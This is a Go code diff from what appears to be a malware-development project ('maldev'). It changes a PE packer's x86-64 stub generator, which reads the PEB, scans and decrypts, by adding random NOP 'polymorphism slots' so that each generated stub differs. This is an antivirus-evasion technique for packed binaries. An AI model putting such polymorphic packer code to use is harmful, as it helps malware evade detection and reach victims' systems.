@@ -3,6 +3,7 @@ package packer
 import (
 	"encoding/binary"
 	"fmt"
+	mathrand "math/rand"
 
 	"github.com/oioio-space/maldev/pe/packer/stubgen/amd64"
 	"github.com/oioio-space/maldev/pe/packer/stubgen/stage1"
@@ -40,6 +41,15 @@ import (
 // Returns the assembled stub bytes plus the PIC imm32 byte offset
 // (always [bundleOffsetImm32Pos] = 10).
 func bundleStubV2NegateWinBuildWindows() ([]byte, int, error) {
+	return bundleStubV2NegateWinBuildWindowsRng(nil)
+}
+
+// bundleStubV2NegateWinBuildWindowsRng is the rng-driven core. rng
+// non-nil → polymorphism slots B (between PEB-build read and the scan
+// loop) and C (between matched-pointer-computation and decrypt) get
+// fresh random NOP runs. rng=nil → deterministic emission for tests
+// and the no-junk public wrapper.
+func bundleStubV2NegateWinBuildWindowsRng(rng *mathrand.Rand) ([]byte, int, error) {
 	b, err := amd64.New()
 	if err != nil {
 		return nil, 0, fmt.Errorf("packer: amd64 builder: %w", err)
@@ -125,6 +135,13 @@ func bundleStubV2NegateWinBuildWindows() ([]byte, int, error) {
 	}
 	if e := check(b.XOR(amd64.RAX, amd64.RAX), "xor eax 2"); e != nil {
 		return nil, 0, e
+	}
+
+	// Polymorphism slot B — between PEB-build read / loop setup and
+	// the scan loop header. Inert NOP run; Builder auto-resolves Jcc
+	// targets that cross this slot.
+	if err := emitNopJunk(b, rng); err != nil {
+		return nil, 0, err
 	}
 
 	// === Section 4: Loop body with R12B-accumulator + negate + winbuild ===
@@ -389,6 +406,13 @@ func bundleStubV2NegateWinBuildWindows() ([]byte, int, error) {
 	}
 	if e := check(b.MOV(amd64.RCX, amd64.R9), "matched mov rcx"); e != nil {
 		return nil, 0, e
+	}
+
+	// Polymorphism slot C — between matched-pointer-computation and
+	// decrypt-step header. Builder labels resolve all jumps that
+	// cross this slot.
+	if err := emitNopJunk(b, rng); err != nil {
+		return nil, 0, err
 	}
 
 	if e := check(b.MOVL(amd64.RDI, amd64.MemOp{Base: amd64.RCX}), "dec mov edi"); e != nil {
